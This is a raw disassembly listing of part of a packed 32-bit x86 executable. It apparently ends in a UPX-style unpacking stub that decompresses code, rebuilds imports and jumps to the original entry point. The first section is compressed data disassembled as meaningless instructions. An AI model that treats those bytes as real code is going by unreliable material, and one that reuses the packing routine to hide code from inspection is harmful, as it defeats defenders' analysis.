  40a120:	84 76 55             	test   %dh,0x55(%esi)
  40a123:	14 26                	adc    $0x26,%al
  40a125:	0a 09                	or     (%ecx),%cl
  40a127:	28 9b 6b df 74 6c    	sub    %bl,0x6c74df6b(%ebx)
  40a12d:	17                   	pop    %ss
  40a12e:	4d                   	dec    %ebp
  40a12f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a130:	57                   	push   %edi
  40a131:	6c                   	insb   (%dx),%es:(%edi)
  40a132:	53                   	push   %ebx
  40a133:	4f                   	dec    %edi
  40a134:	3a f7                	cmp    %bh,%dh
  40a136:	82 e6 a1             	and    $0xa1,%dh
  40a139:	dd 53 50             	fstl   0x50(%ebx)
  40a13c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a13d:	b3 64                	mov    $0x64,%bl
  40a13f:	0e                   	push   %cs
  40a140:	88 69 e4             	mov    %ch,-0x1c(%ecx)
  40a143:	0f ed 09             	paddsw (%ecx),%mm1
  40a146:	ed                   	in     (%dx),%eax
  40a147:	b2 0f                	mov    $0xf,%dl
  40a149:	00 6f 66             	add    %ch,0x66(%edi)
  40a14c:	5e                   	pop    %esi
  40a14d:	57                   	push   %edi
  40a14e:	f3 b5 72             	repz mov $0x72,%ch
  40a151:	b0 ed                	mov    $0xed,%al
  40a153:	84 e3                	test   %ah,%bl
  40a155:	63 bd 41 09 6d 70    	arpl   %edi,0x706d0941(%ebp)
  40a15b:	d9 68 87             	fldcw  -0x79(%eax)
  40a15e:	5d                   	pop    %ebp
  40a15f:	69 0a 70 c5 15 f9    	imul   $0xf915c570,(%edx),%ecx
  40a165:	c2 27 6c             	ret    $0x6c27
  40a168:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a169:	00 46 67             	add    %al,0x67(%esi)
  40a16c:	f6 4b 65 79          	testb  $0x79,0x65(%ebx)
  40a170:	f2 cc                	repnz int3
  40a172:	1c 10                	sbb    $0x10,%al
  40a174:	8f 04 d6             	pop    (%esi,%edx,8)
  40a177:	12 b0 dd c1 2e 27    	adc    0x272ec1dd(%eax),%dh
  40a17d:	73 68                	jae    0x40a1e7
  40a17f:	10 44 65 3a          	adc    %al,0x3a(%ebp,%eiz,2)
  40a183:	6f                   	outsl  %ds:(%esi),(%dx)
  40a184:	79 11                	jns    0x40a197
  40a186:	0a 0b                	or     (%ebx),%cl
  40a188:	cf                   	iret
  40a189:	10 1d 0d 2b 72 5d    	adc    %bl,0x5d722b0d
  40a18f:	de 7b c1             	fidivrs -0x3f(%ebx)
  40a192:	c5 46 a3             	lds    -0x5d(%esi),%eax
  40a195:	c0 6c 75 65 45       	shrb   $0x45,0x65(%ebp,%esi,2)
  40a19a:	0f f8 61 b1          	psubb  -0x4f(%ecx),%mm4
  40a19e:	d6                   	salc
  40a19f:	32 91 56 54 41 63    	xor    0x63415456(%ecx),%dl
  40a1a5:	71 75                	jno    0x40a21c
  40a1a7:	cc                   	int3
  40a1a8:	1a ae 61 48 01 d3    	sbb    -0x2cfeb79f(%esi),%ch
  40a1ae:	2f                   	das
  40a1af:	24 35                	and    $0x35,%al
  40a1b1:	37                   	aaa
  40a1b2:	d8 7b 54             	fdivrs 0x54(%ebx)
  40a1b5:	23 22                	and    (%edx),%esp
  40a1b7:	52                   	push   %edx
  40a1b8:	33 54 b6 7d          	xor    0x7d(%esi,%esi,4),%edx
  40a1bc:	c1 86 22 14 66 44 8e 	roll   $0x8e,0x44661422(%esi)
  40a1c3:	61                   	popa
  40a1c4:	b5 5a                	mov    $0x5a,%ch
  40a1c6:	8c 9f e5 06 01 2c    	mov    %ds,0x2c0106e5(%edi)
  40a1cc:	49                   	dec    %ecx
  40a1cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ce:	69 49 27 4e b3 b5 f6 	imul   $0xf6b5b34e,0x27(%ecx),%ecx
  40a1d5:	2a 98 d8 1c 13 34    	sub    0x34131cd8(%eax),%bl
  40a1db:	45                   	inc    %ebp
  40a1dc:	d8 5c 30 c6          	fcomps -0x3a(%eax,%esi,1)
  40a1e0:	18 26                	sbb    %ah,(%esi)
  40a1e2:	64 b9 4c 10 4f d7    	fs mov $0xd74f104c,%ecx
  40a1e8:	f0 1d 1d d4 53 81    	lock sbb $0x8153d41d,%eax
  40a1ee:	e5 76                	in     $0x76,%eax
  40a1f0:	8e d6                	mov    %esi,%ss
  40a1f2:	a3 15 55 83 53       	mov    %eax,0x53835515
  40a1f7:	48                   	dec    %eax
  40a1f8:	c8 0b cd d0          	enter  $0xcd0b,$0xd0
  40a1fc:	10 d3                	adc    %dl,%bl
  40a1fe:	69 d4 47 7c 72 78    	imul   $0x78727c47,%esp,%edx
  40a204:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a205:	e9 0e fd 30 29       	jmp    0x29719f18
  40a20a:	e0 0f                	loopne 0x40a21b
  40a20c:	6b c9 96             	imul   $0xffffff96,%ecx,%ecx
  40a20f:	f1                   	int1
  40a210:	d5 49                	aad    $0x49
  40a212:	12 46 43             	adc    0x43(%esi),%al
  40a215:	3f                   	aas
  40a216:	98                   	cwtl
  40a217:	09 62 6e             	or     %esp,0x6e(%edx)
  40a21a:	95                   	xchg   %eax,%ebp
  40a21b:	13 41 64             	adc    0x64(%ecx),%eax
  40a21e:	64 42                	fs inc %edx
  40a220:	61                   	popa
  40a221:	6e                   	outsb  %ds:(%esi),(%dx)
  40a222:	83 b9 0b f9 73 6c b1 	cmpl   $0xffffffb1,0x6c73f90b(%ecx)
  40a229:	12 4d 03             	adc    0x3(%ebp),%cl
  40a22c:	63 68 38             	arpl   %ebp,0x38(%eax)
  40a22f:	08 4d f7             	or     %cl,-0x9(%ebp)
  40a232:	5f                   	pop    %edi
  40a233:	52                   	push   %edx
  40a234:	35 f4 74 69 73       	xor    $0x736974f4,%eax
  40a239:	dc 18                	fcompl (%eax)
  40a23b:	a1 6b d8 43 28       	mov    0x2843d86b,%eax
  40a240:	73 2f                	jae    0x40a271
  40a242:	50                   	push   %eax
  40a243:	4e                   	dec    %esi
  40a244:	6b 4d d9 f6          	imul   $0xfffffff6,-0x27(%ebp),%ecx
  40a248:	62 41 6b             	bound  %eax,0x6b(%ecx)
  40a24b:	94                   	xchg   %eax,%esp
  40a24c:	55                   	push   %ebp
  40a24d:	64 0d 85 16 c4 63    	fs or  $0x63c41685,%eax
  40a253:	5a                   	pop    %edx
  40a254:	04 ee                	add    $0xee,%al
  40a256:	9a 5a f7 8c 72 94 53 	lcall  $0x5394,$0x728cf75a
  40a25d:	79 3b                	jns    0x40a29a
  40a25f:	6d                   	insl   (%dx),%es:(%edi)
  40a260:	1f                   	pop    %ds
  40a261:	1a 63 dd             	sbb    -0x23(%ebx),%ah
  40a264:	bb 65 33 ea 2b       	mov    $0x2bea3365,%ebx
  40a269:	0c 44                	or     $0x44,%al
  40a26b:	6c                   	insb   (%dx),%es:(%edi)
  40a26c:	67 49                	addr16 dec %ecx
  40a26e:	1f                   	pop    %ds
  40a26f:	54                   	push   %esp
  40a270:	ce                   	into
  40a271:	d1 da                	rcr    $1,%edx
  40a273:	09 63 45             	or     %esp,0x45(%ebx)
  40a276:	49                   	dec    %ecx
  40a277:	86 45 54             	xchg   %al,0x54(%ebp)
  40a27a:	d1 0c 11             	rorl   $1,(%ecx,%edx,1)
  40a27d:	62 36                	bound  %esi,(%esi)
  40a27f:	af                   	scas   %es:(%edi),%eax
  40a280:	97                   	xchg   %eax,%edi
  40a281:	4e                   	dec    %esi
  40a282:	e6 b6                	out    %al,$0xb6
  40a284:	ce                   	into
  40a285:	05 10 20 54 0f       	add    $0xf542010,%eax
  40a28a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a28b:	b0 11                	mov    $0x11,%al
  40a28d:	33 dc                	xor    %esp,%ebx
  40a28f:	5b                   	pop    %ebx
  40a290:	b0 44                	mov    $0x44,%al
  40a292:	11 55 70             	adc    %edx,0x70(%ebp)
  40a295:	64 0e                	fs push %cs
  40a297:	fa                   	cli
  40a298:	b7 7d                	mov    $0x7d,%bh
  40a29a:	cf                   	iret
  40a29b:	1c bc                	sbb    $0xbc,%al
  40a29d:	16                   	push   %ss
  40a29e:	42                   	inc    %edx
  40a29f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2a0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a2a1:	44                   	inc    %esp
  40a2a2:	b6 70                	mov    $0x70,%dh
  40a2a4:	d0 b3 16 c4 b2 70    	shlb   $1,0x70b2c416(%ebx)
  40a2aa:	dd 29                	(bad) (%ecx)
  40a2ac:	b1 59                	mov    $0x59,%cl
  40a2ae:	b2 4e                	mov    $0x4e,%dl
  40a2b0:	48                   	dec    %eax
  40a2b1:	43                   	inc    %ebx
  40a2b2:	12 d9                	adc    %cl,%bl
  40a2b4:	da 8e cd ba 42 eb    	fimull -0x14bd4533(%esi)
  40a2ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2bb:	82 00 50             	addb   $0x50,(%eax)
  40a2be:	45                   	inc    %ebp
  40a2bf:	03 4c 83 05          	add    0x5(%ebx,%eax,4),%ecx
  40a2c3:	df a8 22 9f 94 25    	fildll 0x25949f22(%eax)
  40a2c9:	4f                   	dec    %edi
  40a2ca:	ef                   	out    %eax,(%dx)
  40a2cb:	e0 2c                	loopne 0x40a2f9
  40a2cd:	47                   	inc    %edi
  40a2ce:	96                   	xchg   %eax,%esi
  40a2cf:	ff 00                	incl   (%eax)
  40a2d1:	0f 01 0b             	sidtl  (%ebx)
  40a2d4:	01 05 0c 00 18 14    	add    %eax,0x1418000c
  40a2da:	d1 21                	shll   $1,(%ecx)
  40a2dc:	10 64 c5 59          	adc    %ah,0x59(%ebp,%eax,8)
  40a2e0:	b3 30                	mov    $0x30,%bl
  40a2e2:	40                   	inc    %eax
  40a2e3:	0b 02                	or     (%edx),%eax
  40a2e5:	01 99 5b 36 c8 04    	add    %ebx,0x4c8365b(%ecx)
  40a2eb:	90                   	nop
  40a2ec:	0c 1e                	or     $0x1e,%al
  40a2ee:	34 7b                	xor    $0x7b,%al
  40a2f0:	d9 1b                	fstps  (%ebx)
  40a2f2:	d8 10                	fcoms  (%eax)
  40a2f4:	07                   	pop    %es
  40a2f5:	06                   	push   %es
  40a2f6:	00 38                	add    %bh,(%eax)
  40a2f8:	31 08                	xor    %ecx,(%eax)
  40a2fa:	84 b8 15 67 a0 2e    	test   %bh,0x2ea06715(%eax)
  40a300:	ac                   	lods   %ds:(%esi),%al
  40a301:	03 71 2b             	add    0x2b(%ecx),%esi
  40a304:	6c                   	insb   (%dx),%es:(%edi)
  40a305:	b7 02                	mov    $0x2,%bh
  40a307:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a308:	38 01                	cmp    %al,(%ecx)
  40a30a:	1e                   	push   %ds
  40a30b:	8a c1                	mov    %cl,%al
  40a30d:	76 8f                	jbe    0x40a29e
  40a30f:	2e d1 07             	roll   $1,%cs:(%edi)
  40a312:	88 16                	mov    %dl,(%esi)
  40a314:	90                   	nop
  40a315:	18 c7                	sbb    %al,%bh
  40a317:	78 47                	js     0x40a360
  40a319:	ca ce 1b             	lret   $0x1bce
  40a31c:	60                   	pusha
  40a31d:	2e 72 64             	jb,pn  0x40a384
  40a320:	eb 20                	jmp    0x40a342
  40a322:	08 77 21             	or     %dh,0x21(%edi)
  40a325:	dd 60 fb             	frstor -0x5(%eax)
  40a328:	0a 27                	or     (%edi),%ah
  40a32a:	1c 40                	sbb    $0x40,%al
  40a32c:	02 9a ee ec 5e 2e    	add    0x2e5eecee(%edx),%bl
  40a332:	26 10 bb 38 27 06 26 	adc    %bh,%es:0x26062738(%ebx)
  40a339:	b0 a5                	mov    $0xa5,%al
  40a33b:	6d                   	insl   (%dx),%es:(%edi)
  40a33c:	4a                   	dec    %edx
  40a33d:	c0 4f 73 f3          	rorb   $0xf3,0x73(%edi)
  40a341:	00 eb                	add    %ch,%bl
  40a343:	7e 2b                	jle    0x40a370
  40a345:	1b 6c 80 73          	sbb    0x73(%eax,%eax,4),%ebp
  40a349:	2c 27                	sub    $0x27,%al
  40a34b:	1b 10                	sbb    (%eax),%edx
  40a34d:	33 00                	xor    (%eax),%eax
  40a34f:	00 e0                	add    %ah,%al
  40a351:	11 50 84             	adc    %edx,-0x7c(%eax)
  40a354:	00 00                	add    %al,(%eax)
  40a356:	90                   	nop
  40a357:	00 00                	add    %al,(%eax)
  40a359:	00 ff                	add    %bh,%bh
  40a35b:	00 00                	add    %al,(%eax)
  40a35d:	00 00                	add    %al,(%eax)
  40a35f:	00 60 be             	add    %ah,-0x42(%eax)
  40a362:	15 90 40 00 8d       	adc    $0x8d004090,%eax
  40a367:	be eb 7f ff ff       	mov    $0xffff7feb,%esi
  40a36c:	57                   	push   %edi
  40a36d:	eb 0b                	jmp    0x40a37a
  40a36f:	90                   	nop
  40a370:	8a 06                	mov    (%esi),%al
  40a372:	46                   	inc    %esi
  40a373:	88 07                	mov    %al,(%edi)
  40a375:	47                   	inc    %edi
  40a376:	01 db                	add    %ebx,%ebx
  40a378:	75 07                	jne    0x40a381
  40a37a:	8b 1e                	mov    (%esi),%ebx
  40a37c:	83 ee fc             	sub    $0xfffffffc,%esi
  40a37f:	11 db                	adc    %ebx,%ebx
  40a381:	72 ed                	jb     0x40a370
  40a383:	b8 01 00 00 00       	mov    $0x1,%eax
  40a388:	01 db                	add    %ebx,%ebx
  40a38a:	75 07                	jne    0x40a393
  40a38c:	8b 1e                	mov    (%esi),%ebx
  40a38e:	83 ee fc             	sub    $0xfffffffc,%esi
  40a391:	11 db                	adc    %ebx,%ebx
  40a393:	11 c0                	adc    %eax,%eax
  40a395:	01 db                	add    %ebx,%ebx
  40a397:	73 ef                	jae    0x40a388
  40a399:	75 09                	jne    0x40a3a4
  40a39b:	8b 1e                	mov    (%esi),%ebx
  40a39d:	83 ee fc             	sub    $0xfffffffc,%esi
  40a3a0:	11 db                	adc    %ebx,%ebx
  40a3a2:	73 e4                	jae    0x40a388
  40a3a4:	31 c9                	xor    %ecx,%ecx
  40a3a6:	83 e8 03             	sub    $0x3,%eax
  40a3a9:	72 0d                	jb     0x40a3b8
  40a3ab:	c1 e0 08             	shl    $0x8,%eax
  40a3ae:	8a 06                	mov    (%esi),%al
  40a3b0:	46                   	inc    %esi
  40a3b1:	83 f0 ff             	xor    $0xffffffff,%eax
  40a3b4:	74 74                	je     0x40a42a
  40a3b6:	89 c5                	mov    %eax,%ebp
  40a3b8:	01 db                	add    %ebx,%ebx
  40a3ba:	75 07                	jne    0x40a3c3
  40a3bc:	8b 1e                	mov    (%esi),%ebx
  40a3be:	83 ee fc             	sub    $0xfffffffc,%esi
  40a3c1:	11 db                	adc    %ebx,%ebx
  40a3c3:	11 c9                	adc    %ecx,%ecx
  40a3c5:	01 db                	add    %ebx,%ebx
  40a3c7:	75 07                	jne    0x40a3d0
  40a3c9:	8b 1e                	mov    (%esi),%ebx
  40a3cb:	83 ee fc             	sub    $0xfffffffc,%esi
  40a3ce:	11 db                	adc    %ebx,%ebx
  40a3d0:	11 c9                	adc    %ecx,%ecx
  40a3d2:	75 20                	jne    0x40a3f4
  40a3d4:	41                   	inc    %ecx
  40a3d5:	01 db                	add    %ebx,%ebx
  40a3d7:	75 07                	jne    0x40a3e0
  40a3d9:	8b 1e                	mov    (%esi),%ebx
  40a3db:	83 ee fc             	sub    $0xfffffffc,%esi
  40a3de:	11 db                	adc    %ebx,%ebx
  40a3e0:	11 c9                	adc    %ecx,%ecx
  40a3e2:	01 db                	add    %ebx,%ebx
  40a3e4:	73 ef                	jae    0x40a3d5
  40a3e6:	75 09                	jne    0x40a3f1
  40a3e8:	8b 1e                	mov    (%esi),%ebx
  40a3ea:	83 ee fc             	sub    $0xfffffffc,%esi
  40a3ed:	11 db                	adc    %ebx,%ebx
  40a3ef:	73 e4                	jae    0x40a3d5
  40a3f1:	83 c1 02             	add    $0x2,%ecx
  40a3f4:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  40a3fa:	83 d1 01             	adc    $0x1,%ecx
  40a3fd:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  40a400:	83 fd fc             	cmp    $0xfffffffc,%ebp
  40a403:	76 0f                	jbe    0x40a414
  40a405:	8a 02                	mov    (%edx),%al
  40a407:	42                   	inc    %edx
  40a408:	88 07                	mov    %al,(%edi)
  40a40a:	47                   	inc    %edi
  40a40b:	49                   	dec    %ecx
  40a40c:	75 f7                	jne    0x40a405
  40a40e:	e9 63 ff ff ff       	jmp    0x40a376
  40a413:	90                   	nop
  40a414:	8b 02                	mov    (%edx),%eax
  40a416:	83 c2 04             	add    $0x4,%edx
  40a419:	89 07                	mov    %eax,(%edi)
  40a41b:	83 c7 04             	add    $0x4,%edi
  40a41e:	83 e9 04             	sub    $0x4,%ecx
  40a421:	77 f1                	ja     0x40a414
  40a423:	01 cf                	add    %ecx,%edi
  40a425:	e9 4c ff ff ff       	jmp    0x40a376
  40a42a:	5e                   	pop    %esi
  40a42b:	89 f7                	mov    %esi,%edi
  40a42d:	b9 f0 00 00 00       	mov    $0xf0,%ecx
  40a432:	8a 07                	mov    (%edi),%al
  40a434:	47                   	inc    %edi
  40a435:	2c e8                	sub    $0xe8,%al
  40a437:	3c 01                	cmp    $0x1,%al
  40a439:	77 f7                	ja     0x40a432
  40a43b:	80 3f 00             	cmpb   $0x0,(%edi)
  40a43e:	75 f2                	jne    0x40a432
  40a440:	8b 07                	mov    (%edi),%eax
  40a442:	8a 5f 04             	mov    0x4(%edi),%bl
  40a445:	66 c1 e8 08          	shr    $0x8,%ax
  40a449:	c1 c0 10             	rol    $0x10,%eax
  40a44c:	86 c4                	xchg   %al,%ah
  40a44e:	29 f8                	sub    %edi,%eax
  40a450:	80 eb e8             	sub    $0xe8,%bl
  40a453:	01 f0                	add    %esi,%eax
  40a455:	89 07                	mov    %eax,(%edi)
  40a457:	83 c7 05             	add    $0x5,%edi
  40a45a:	88 d8                	mov    %bl,%al
  40a45c:	e2 d9                	loop   0x40a437
  40a45e:	8d be 00 80 00 00    	lea    0x8000(%esi),%edi
  40a464:	8b 07                	mov    (%edi),%eax
  40a466:	09 c0                	or     %eax,%eax
  40a468:	74 3c                	je     0x40a4a6
  40a46a:	8b 5f 04             	mov    0x4(%edi),%ebx
  40a46d:	8d 84 30 ac a0 00 00 	lea    0xa0ac(%eax,%esi,1),%eax
  40a474:	01 f3                	add    %esi,%ebx
  40a476:	50                   	push   %eax
  40a477:	83 c7 08             	add    $0x8,%edi
  40a47a:	ff 96 4c a1 00 00    	call   *0xa14c(%esi)
  40a480:	95                   	xchg   %eax,%ebp
  40a481:	8a 07                	mov    (%edi),%al
  40a483:	47                   	inc    %edi
  40a484:	08 c0                	or     %al,%al
  40a486:	74 dc                	je     0x40a464
  40a488:	89 f9                	mov    %edi,%ecx
  40a48a:	57                   	push   %edi
  40a48b:	48                   	dec    %eax
  40a48c:	f2 ae                	repnz scas %es:(%edi),%al
  40a48e:	55                   	push   %ebp
  40a48f:	ff 96 50 a1 00 00    	call   *0xa150(%esi)
  40a495:	09 c0                	or     %eax,%eax
  40a497:	74 07                	je     0x40a4a0
  40a499:	89 03                	mov    %eax,(%ebx)
  40a49b:	83 c3 04             	add    $0x4,%ebx
  40a49e:	eb e1                	jmp    0x40a481
  40a4a0:	ff 96 60 a1 00 00    	call   *0xa160(%esi)
  40a4a6:	8b ae 54 a1 00 00    	mov    0xa154(%esi),%ebp
  40a4ac:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  40a4b2:	bb 00 10 00 00       	mov    $0x1000,%ebx
  40a4b7:	50                   	push   %eax
  40a4b8:	54                   	push   %esp
  40a4b9:	6a 04                	push   $0x4
  40a4bb:	53                   	push   %ebx
  40a4bc:	57                   	push   %edi
  40a4bd:	ff d5                	call   *%ebp
  40a4bf:	8d 87 9f 01 00 00    	lea    0x19f(%edi),%eax
  40a4c5:	80 20 7f             	andb   $0x7f,(%eax)
  40a4c8:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  40a4cc:	58                   	pop    %eax
  40a4cd:	50                   	push   %eax
  40a4ce:	54                   	push   %esp
  40a4cf:	50                   	push   %eax
  40a4d0:	53                   	push   %ebx
  40a4d1:	57                   	push   %edi
  40a4d2:	ff d5                	call   *%ebp
  40a4d4:	58                   	pop    %eax
  40a4d5:	61                   	popa
  40a4d6:	8d 44 24 80          	lea    -0x80(%esp),%eax
  40a4da:	6a 00                	push   $0x0
  40a4dc:	39 c4                	cmp    %eax,%esp
  40a4de:	75 fa                	jne    0x40a4da
  40a4e0:	83 ec 80             	sub    $0xffffff80,%esp
  40a4e3:	e9 e9 7c ff ff       	jmp    0x4021d1
	...
